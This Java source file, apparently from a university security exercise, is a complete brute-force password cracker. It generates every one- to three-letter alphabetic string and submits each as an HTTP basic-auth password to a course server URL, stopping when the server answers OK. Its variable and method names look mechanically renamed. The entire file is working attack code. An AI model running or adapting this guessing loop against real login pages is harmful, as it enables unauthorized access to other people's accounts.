import java.util.*;
import java.net.*;
import java.io.*;
public class BruteForce {
    boolean f00 = false;
    int f10;
    String[] f20 = {"a", "b", "c", "d", "e", "f", "g", "h",
                    "i", "j", "k", "l", "m", "n", "o", "p",
                    "q", "r", "s", "t", "u", "v", "w", "x",
                    "y", "z", "A", "B", "C", "D", "E", "F",
                    "G", "H", "I", "J", "K", "L", "M", "N",
                    "O", "P", "Q", "R", "S", "T", "U", "V",
                    "W", "X", "Y", "Z"
                   };
    Vector f30 = new Vector();
    BruteForce() {
        f10 = 0;
        this.m10();
        this.m00();
    }
    public void m00() {
        for ( ; f10 < this.f30.size(); ) {
            f00 = m20();
            if ( f00 == true ) {
                System.out.print ( "The password is: " );
                System.out.println ( ( String ) f30.elementAt ( f10 - 1 ) );
                f10 = f30.size();
            }
        }
    }
    public void m10() {
        String v0;
        v0 = new String();
        int v1;
        v1 = 0;
        while ( v1 < 52 ) {
            v0 = f20[v1];
            this.f30.addElement ( v0 );
            v1 = v1 + 1;
        }
        int v2;
        v2 = 0;
        while ( v2 < 52 ) {
            int v3;
            v3 = 0;
            while ( v3 < 52 ) {
                v0 = f20[v2] + f20[v3];
                this.f30.addElement ( v0 );
                v3 = v3 + 1;
            }
            v2 = v2 + 1;
        }
        int v4;
        v4 = 0;
        while ( v4 < 52 ) {
            int v5;
            v5 = 0;
            while ( v5 < 52 ) {
                int v6;
                v6 = 0;
                while ( v6 < 52 ) {
                    v0 = f20[v4] + f20[v5] + f20[v6];
                    this.f30.addElement ( v0 );
                    v6 = v6 + 1;
                }
                v5 = v5 + 1;
            }
            v4 = v4 + 1;
        }
    }
    public boolean m20() {
        Authenticator.setDefault ( new MyAuthenticator () );
        try {
            URL v7;
            v7 = new URL ( "http://sec-crack.cs.rmit.edu./SEC/2/" );
            HttpURLConnection v8;
            v8 = ( HttpURLConnection ) v7.openConnection();
            v8.connect();
            if ( v8.getResponseMessage().equalsIgnoreCase ( "OK" ) ) {
                return true;
            }
        } catch ( IOException v9 ) {}
        return false;
    }
    public static void main ( String [] v10 ) {
        BruteForce v11;
        v11 = new BruteForce();
    }
    class MyAuthenticator extends Authenticator {
        protected PasswordAuthentication getPasswordAuthentication() {
            String v12;
            v12 = "";
            String v13;
            v13 = ( String ) f30.elementAt ( f10 );
            f10 = f10 + 1;
            return new PasswordAuthentication ( v12, v13.toCharArray() );
        }
    }
}
